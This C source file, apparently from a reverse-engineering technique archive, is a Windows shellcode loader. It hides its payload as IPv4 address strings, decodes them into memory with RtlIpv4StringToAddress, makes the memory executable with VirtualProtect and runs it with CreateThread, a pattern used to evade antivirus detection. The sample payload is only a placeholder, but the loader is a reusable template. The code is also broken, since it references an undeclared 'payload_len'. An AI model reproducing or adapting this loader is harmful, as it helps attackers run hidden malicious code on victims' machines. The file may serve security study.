/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlIpv4StringToAddress
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>
#include <ip2string.h>

#pragma comment(lib,"ntdll")


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    char *      payload []  = { "144.144.204.195" };
    uint32_t    nitem       = 1;

    uint32_t    idx;
    in_addr *   ip4;
    PCSTR       terminator = "";

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, nitem * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    ip4 = (in_addr*) runtime;
    for (uint32_t idx = 0; idx < nitem; idx++, ip4++)
    {
        RtlIpv4StringToAddress (payload[idx], FALSE, &terminator, ip4);
    }

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, nitem * 4, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}